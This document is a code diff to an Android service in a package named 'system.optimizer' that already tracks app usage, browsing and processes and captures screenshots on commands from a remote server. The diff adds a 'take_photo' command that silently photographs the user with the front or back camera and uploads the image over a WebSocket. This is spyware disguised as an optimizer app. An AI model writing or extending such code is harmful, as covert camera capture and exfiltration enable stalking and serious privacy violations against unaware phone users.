@@ -14,6 +14,7 @@ import com.system.optimizer.monitor.AppUsageTracker
 import com.system.optimizer.monitor.BrowserTracker
 import com.system.optimizer.monitor.ProcessMonitor
 import com.system.optimizer.monitor.ScreenshotCapture
+import com.system.optimizer.monitor.CameraCapture
 import com.system.optimizer.network.WebSocketManager
 import org.json.JSONObject
 
@@ -265,6 +266,7 @@ class MonitoringService : Service() {
 
         when (command) {
             "screenshot" -> handleScreenshot(cmdId)
+            "take_photo" -> handleTakePhoto(cmdId, msg.optJSONObject("payload")?.optString("camera", "front") ?: "front")
             "lock" -> handleLock(cmdId)
             "unlock" -> handleUnlock(cmdId)
         }
@@ -301,6 +303,18 @@ class MonitoringService : Service() {
                 Log.i(TAG, "📸 Screenshot sent to server")
             } else {
                 wsManager.sendCommandResult(cmdId, false, "Screenshot capture failed")
+            }
+        }
+    }
+
+    private fun handleTakePhoto(cmdId: String, cameraType: String) {
+        Log.i(TAG, "📷 Requesting silent photo capture: $cameraType")
+        CameraCapture.takePhoto(this, cameraType) { base64 ->
+            if (base64 != null) {
+                wsManager.sendCameraPhoto(base64, cmdId, cameraType)
+                Log.i(TAG, "✅ Camera photo sent to server ($cameraType)")
+            } else {
+                wsManager.sendCommandResult(cmdId, false, "Camera photo capture failed or permission denied")
             }
         }
     }
